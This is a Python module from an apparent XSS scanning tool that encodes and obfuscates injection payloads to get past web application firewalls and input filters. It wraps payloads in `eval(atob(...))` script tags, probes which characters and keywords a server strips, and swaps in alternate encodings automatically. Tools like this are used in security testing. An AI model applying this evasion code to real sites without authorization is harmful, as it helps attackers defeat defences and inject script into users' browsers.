#!/usr/bin/env python3

"""
Project: BRS-XSS
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: Thu 26 Dec 2025 21:05:00 UTC
Status: Created

Encoding Engine - Automatic encoding/obfuscation for filter bypass.
Applies multiple encoding layers to evade WAFs and filters.
"""

import html
import base64
from dataclasses import dataclass
from enum import Enum
from urllib.parse import quote

from brsxss.utils.logger import Logger

logger = Logger("core.encoding_engine")


class EncodingType(Enum):
    """Types of encoding"""

    NONE = "none"
    URL = "url"
    URL_DOUBLE = "url_double"
    URL_UNICODE = "url_unicode"
    HTML_ENTITY = "html_entity"
    HTML_DECIMAL = "html_decimal"
    HTML_HEX = "html_hex"
    UNICODE_ESCAPE = "unicode_escape"
    HEX_ESCAPE = "hex_escape"
    OCTAL_ESCAPE = "octal_escape"
    BASE64 = "base64"
    JSF_UCK = "jsfuck"
    CHAR_CODE = "char_code"
    TEMPLATE_LITERAL = "template_literal"


@dataclass
class EncodedPayload:
    """Encoded payload with metadata"""

    original: str
    encoded: str
    encoding_type: EncodingType
    encoding_chain: list[EncodingType]

    def __str__(self) -> str:
        return self.encoded


class EncodingEngine:
    """
    Apply various encodings to bypass filters.

    Capabilities:
    - Single and multi-layer encoding
    - Context-aware encoding selection
    - Filter detection and adaptive encoding
    - Encoding chain optimization
    """

    def __init__(self):
        """Initialize encoding engine"""
        self.encoding_stats: dict[EncodingType, int] = {e: 0 for e in EncodingType}
        logger.info("Encoding engine initialized")

    def encode(
        self, payload: str, encoding: EncodingType, context: str = "html"
    ) -> str:
        """
        Apply single encoding to payload.

        Args:
            payload: Original payload
            encoding: Type of encoding to apply
            context: Target context (html, js, url, etc.)

        Returns:
            Encoded payload
        """
        self.encoding_stats[encoding] += 1

        encoders = {
            EncodingType.NONE: lambda x: x,
            EncodingType.URL: self._url_encode,
            EncodingType.URL_DOUBLE: self._url_double_encode,
            EncodingType.URL_UNICODE: self._url_unicode_encode,
            EncodingType.HTML_ENTITY: self._html_entity_encode,
            EncodingType.HTML_DECIMAL: self._html_decimal_encode,
            EncodingType.HTML_HEX: self._html_hex_encode,
            EncodingType.UNICODE_ESCAPE: self._unicode_escape,
            EncodingType.HEX_ESCAPE: self._hex_escape,
            EncodingType.OCTAL_ESCAPE: self._octal_escape,
            EncodingType.BASE64: lambda x: self._base64_encode(x, context),
            EncodingType.CHAR_CODE: self._char_code_encode,
            EncodingType.TEMPLATE_LITERAL: self._template_literal_encode,
        }

        encoder = encoders.get(encoding, lambda x: x)
        return encoder(payload)

    def encode_chain(
        self, payload: str, chain: list[EncodingType], context: str = "html"
    ) -> EncodedPayload:
        """
        Apply chain of encodings.

        Args:
            payload: Original payload
            chain: list of encodings to apply in order
            context: Target context

        Returns:
            EncodedPayload with full chain
        """
        result = payload

        for encoding in chain:
            result = self.encode(result, encoding, context)

        return EncodedPayload(
            original=payload,
            encoded=result,
            encoding_type=chain[-1] if chain else EncodingType.NONE,
            encoding_chain=chain,
        )

    def generate_variants(
        self, payload: str, context: str = "html", max_variants: int = 20
    ) -> list[EncodedPayload]:
        """
        Generate multiple encoded variants of payload.

        Args:
            payload: Original payload
            context: Target context
            max_variants: Maximum variants to generate

        Returns:
            list of encoded variants
        """
        variants = []

        # Context-specific encoding strategies
        if context in ("html", "html_content", "html_attribute"):
            strategies = [
                [EncodingType.HTML_ENTITY],
                [EncodingType.HTML_DECIMAL],
                [EncodingType.HTML_HEX],
                [EncodingType.URL],
                [EncodingType.URL, EncodingType.HTML_ENTITY],
                [EncodingType.HTML_DECIMAL, EncodingType.URL],
            ]
        elif context in ("javascript", "js", "js_string"):
            strategies = [
                [EncodingType.UNICODE_ESCAPE],
                [EncodingType.HEX_ESCAPE],
                [EncodingType.CHAR_CODE],
                [EncodingType.TEMPLATE_LITERAL],
                [EncodingType.BASE64],
                [EncodingType.OCTAL_ESCAPE],
            ]
        elif context in ("url", "url_parameter"):
            strategies = [
                [EncodingType.URL],
                [EncodingType.URL_DOUBLE],
                [EncodingType.URL_UNICODE],
                [EncodingType.URL, EncodingType.URL],
            ]
        else:
            # Generic strategies
            strategies = [
                [EncodingType.URL],
                [EncodingType.HTML_ENTITY],
                [EncodingType.UNICODE_ESCAPE],
                [EncodingType.URL_DOUBLE],
            ]

        # Apply strategies
        for chain in strategies[:max_variants]:
            try:
                variant = self.encode_chain(payload, chain, context)
                variants.append(variant)
            except Exception as e:
                logger.debug(f"Encoding failed: {e}")

        # Add mixed character encodings
        mixed_variants = self._generate_mixed_encodings(payload, context)
        variants.extend(mixed_variants[: max_variants - len(variants)])

        return variants[:max_variants]

    def auto_encode(
        self, payload: str, blocked_chars: list[str], context: str = "html"
    ) -> list[EncodedPayload]:
        """
        Automatically encode to bypass specific blocked characters.

        Args:
            payload: Original payload
            blocked_chars: Characters that are filtered
            context: Target context

        Returns:
            list of encoded payloads avoiding blocked chars
        """
        results = []

        # Determine best encodings for each blocked char
        char_encodings = {
            "<": [
                ("&lt;", EncodingType.HTML_ENTITY),
                ("&#60;", EncodingType.HTML_DECIMAL),
                ("&#x3c;", EncodingType.HTML_HEX),
                ("%3C", EncodingType.URL),
                ("\\u003c", EncodingType.UNICODE_ESCAPE),
                ("\\x3c", EncodingType.HEX_ESCAPE),
            ],
            ">": [
                ("&gt;", EncodingType.HTML_ENTITY),
                ("&#62;", EncodingType.HTML_DECIMAL),
                ("&#x3e;", EncodingType.HTML_HEX),
                ("%3E", EncodingType.URL),
                ("\\u003e", EncodingType.UNICODE_ESCAPE),
            ],
            '"': [
                ("&quot;", EncodingType.HTML_ENTITY),
                ("&#34;", EncodingType.HTML_DECIMAL),
                ("%22", EncodingType.URL),
                ("\\u0022", EncodingType.UNICODE_ESCAPE),
                ("\\x22", EncodingType.HEX_ESCAPE),
            ],
            "'": [
                ("&#39;", EncodingType.HTML_DECIMAL),
                ("%27", EncodingType.URL),
                ("\\u0027", EncodingType.UNICODE_ESCAPE),
                ("\\x27", EncodingType.HEX_ESCAPE),
            ],
            "(": [
                ("&#40;", EncodingType.HTML_DECIMAL),
                ("%28", EncodingType.URL),
                ("\\u0028", EncodingType.UNICODE_ESCAPE),
            ],
            ")": [
                ("&#41;", EncodingType.HTML_DECIMAL),
                ("%29", EncodingType.URL),
                ("\\u0029", EncodingType.UNICODE_ESCAPE),
            ],
            "/": [
                ("&#47;", EncodingType.HTML_DECIMAL),
                ("%2F", EncodingType.URL),
                ("\\u002f", EncodingType.UNICODE_ESCAPE),
            ],
            "\\": [
                ("&#92;", EncodingType.HTML_DECIMAL),
                ("%5C", EncodingType.URL),
                ("\\\\", EncodingType.NONE),
            ],
            " ": [
                ("&#32;", EncodingType.HTML_DECIMAL),
                ("%20", EncodingType.URL),
                ("+", EncodingType.URL),
                ("/**/", EncodingType.NONE),  # JS comment as space
            ],
        }

        # For each blocked char, try different encodings
        for blocked in blocked_chars:
            if blocked in char_encodings and blocked in payload:
                for replacement, enc_type in char_encodings[blocked]:
                    encoded = payload.replace(blocked, replacement)

                    # Check if result still contains blocked chars
                    has_blocked = any(
                        b in encoded for b in blocked_chars if b != blocked
                    )

                    if not has_blocked or blocked not in encoded:
                        results.append(
                            EncodedPayload(
                                original=payload,
                                encoded=encoded,
                                encoding_type=enc_type,
                                encoding_chain=[enc_type],
                            )
                        )

        return results

    def detect_filter(self, original: str, response: str) -> tuple[bool, list[str]]:
        """
        Detect what characters/patterns are filtered.

        Args:
            original: Original payload sent
            response: Response from server

        Returns:
            (is_filtered, list of filtered chars/patterns)
        """
        filtered = []

        # Check each dangerous character
        dangerous = ["<", ">", '"', "'", "/", "\\", "(", ")", "`", ";"]

        for char in dangerous:
            if char in original and char not in response:
                # Check if it was encoded
                encoded_forms = [
                    html.escape(char),
                    quote(char),
                    f"&#{ord(char)};",
                ]

                found_encoded = any(enc in response for enc in encoded_forms)

                if not found_encoded:
                    filtered.append(char)

        # Check for keyword filtering
        keywords = ["script", "alert", "onerror", "onload", "javascript", "eval"]
        for kw in keywords:
            if kw.lower() in original.lower() and kw.lower() not in response.lower():
                filtered.append(kw)

        return len(filtered) > 0, filtered

    def _generate_mixed_encodings(
        self, payload: str, context: str
    ) -> list[EncodedPayload]:
        """Generate payloads with mixed character encodings"""
        results = []

        # Partially encode - encode only dangerous chars
        dangerous = "<>\"'()/"

        for char in dangerous:
            if char in payload:
                # Encode just this character
                if context in ("html", "html_content"):
                    encoded = payload.replace(char, f"&#{ord(char)};")
                elif context in ("javascript", "js"):
                    encoded = payload.replace(char, f"\\x{ord(char):02x}")
                else:
                    encoded = payload.replace(char, quote(char))

                results.append(
                    EncodedPayload(
                        original=payload,
                        encoded=encoded,
                        encoding_type=EncodingType.HTML_DECIMAL,
                        encoding_chain=[EncodingType.HTML_DECIMAL],
                    )
                )

        return results

    # Individual encoding methods

    def _url_encode(self, text: str) -> str:
        """Standard URL encoding"""
        return quote(text, safe="")

    def _url_double_encode(self, text: str) -> str:
        """Double URL encoding"""
        return quote(quote(text, safe=""), safe="")

    def _url_unicode_encode(self, text: str) -> str:
        """URL encoding with unicode escapes"""
        result = []
        for char in text:
            if ord(char) > 127 or char in "<>\"'":
                result.append(f"%u{ord(char):04x}")
            else:
                result.append(quote(char, safe=""))
        return "".join(result)

    def _html_entity_encode(self, text: str) -> str:
        """HTML entity encoding"""
        return html.escape(text)

    def _html_decimal_encode(self, text: str) -> str:
        """HTML decimal encoding (&#65;)"""
        return "".join(f"&#{ord(c)};" for c in text)

    def _html_hex_encode(self, text: str) -> str:
        """HTML hex encoding (&#x41;)"""
        return "".join(f"&#x{ord(c):x};" for c in text)

    def _unicode_escape(self, text: str) -> str:
        """JavaScript unicode escape (\\u0041)"""
        return "".join(f"\\u{ord(c):04x}" for c in text)

    def _hex_escape(self, text: str) -> str:
        """JavaScript hex escape (\\x41)"""
        return "".join(f"\\x{ord(c):02x}" for c in text)

    def _octal_escape(self, text: str) -> str:
        """JavaScript octal escape (\\101)"""
        return "".join(f"\\{ord(c):o}" for c in text)

    def _base64_encode(self, text: str, context: str) -> str:
        """Base64 encoding with execution wrapper"""
        encoded = base64.b64encode(text.encode()).decode()

        if context in ("javascript", "js"):
            return f"eval(atob('{encoded}'))"
        elif context == "html":
            return f"<script>eval(atob('{encoded}'))</script>"
        else:
            return encoded

    def _char_code_encode(self, text: str) -> str:
        """String.fromCharCode encoding"""
        codes = ",".join(str(ord(c)) for c in text)
        return f"String.fromCharCode({codes})"

    def _template_literal_encode(self, text: str) -> str:
        """JavaScript template literal encoding"""
        # Convert to template with expressions
        result = []
        for char in text:
            result.append(f"${{String.fromCharCode({ord(char)})}}")
        return "`" + "".join(result) + "`"

    def get_statistics(self) -> dict[str, int]:
        """Get encoding statistics"""
        return {
            enc.value: count for enc, count in self.encoding_stats.items() if count > 0
        }
